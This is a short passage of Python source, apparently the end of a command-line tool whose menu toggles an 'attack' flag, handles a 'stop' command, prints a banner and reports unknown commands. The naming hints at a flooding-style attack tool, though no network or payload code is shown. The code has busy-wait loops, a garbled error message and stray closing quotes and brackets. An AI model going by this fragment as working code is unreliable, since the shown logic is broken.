			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			print('\033[39m[\033[91m404\033[39m] Error. Cannot Command was not found!')
			main()


try:
	clear = "clear"
	os.system("clear")
	print(banner)
	main()
except KeyboardInterrupt:
	exit()'))